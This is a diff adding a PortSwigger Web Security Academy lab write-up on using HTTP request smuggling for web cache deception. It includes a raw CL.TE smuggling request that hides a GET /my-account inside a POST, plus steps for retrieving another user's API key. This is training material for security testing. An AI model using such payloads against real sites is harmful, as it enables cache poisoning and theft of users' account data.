@@ -712,6 +712,48 @@ Open home link in incognito
 
 We can use burpe search to look for api key (PRO version) but saw it in the following 
 
+**Exploiting HTTP request smuggling to perform web cache deception**
+
+Login  
+Capture response and changed to smuggle
+```
+POST / HTTP/1.1
+Host: 0ab400b6040218b282d3152200d6004f.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 42
+Transfer-Encoding: chunked
+
+0
+
+GET /my-account HTTP/1.1
+X-Ignore: X
+```
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/fdaed396-17a7-4c6b-a2ec-7ae761193193)
+
+
+
+
+
+Open home link in incognito 
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/f4c81f0b-599b-4878-8fff-0a006dee5b65)
+
+
+
+We can use burpe search to look for api (PRO version) but saw it in the following 
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/9c4cbcec-8fc0-407e-abd4-d395db61aeec)
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
